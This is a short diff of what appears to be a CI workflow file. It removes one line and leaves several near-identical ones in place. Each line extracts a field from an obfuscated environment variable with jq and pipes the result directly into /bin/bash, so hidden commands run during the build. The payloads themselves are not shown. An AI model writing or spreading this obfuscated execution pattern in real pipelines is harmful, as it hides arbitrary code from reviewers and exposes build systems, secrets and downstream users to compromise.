@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$kjp08318" | jq -r .g3 | /bin/bash
           printf '%s' "$ocghv68" | jq -r .nwmii1 | /bin/bash
           echo $ta53 | jq -r .qsb0232 | /bin/bash
-          echo $gq139 | jq -r .ypoc18 | /bin/bash
           printf '%s' "$yd03" | jq -r .yf00568 | /bin/bash
           printf '%s' "$avx75" | jq -r .bn7 | /bin/bash
           printf '%s' "$m32915" | jq -r .as295 | /bin/bash
